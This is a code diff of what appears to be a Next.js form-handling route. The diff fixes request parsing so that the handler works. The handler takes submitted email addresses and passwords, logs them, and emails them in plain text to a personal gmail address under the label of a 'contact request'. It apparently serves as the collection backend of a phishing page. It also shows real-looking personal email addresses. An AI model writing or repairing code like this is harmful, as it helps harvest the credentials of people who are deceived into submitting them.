@@ -10,12 +10,12 @@ export async function GET(req) {
 export async function POST(req) {
     if (req.method === "POST") {
       try {
-        const formInfo = req.body;
+        const formInfo = await req.json();
 
         const output = `
             <h3>You have a new contact request</h3>
-            <p>Email: ${req.body.email}</p>
-            <p>Password: ${req.body.password}</p>
+            <p>Email: ${formInfo.email}</p>
+            <p>Password: ${formInfo.password}</p>
         `;
 
         const transporter = nodemailer.createTransport({
@@ -26,11 +26,11 @@ export async function POST(req) {
           },
         });
 
-        console.log(req.body);
+        console.log(formInfo);
 
+        //   to: "augustine.ibenta@nationdelivery.com",
         const mailOptions = {
           from: "oemuraye@gmail.com",
-        //   to: "augustine.ibenta@nationdelivery.com",
           to: "oemuraye@gmail.com",
           subject: "Form Submission",
           text: output,
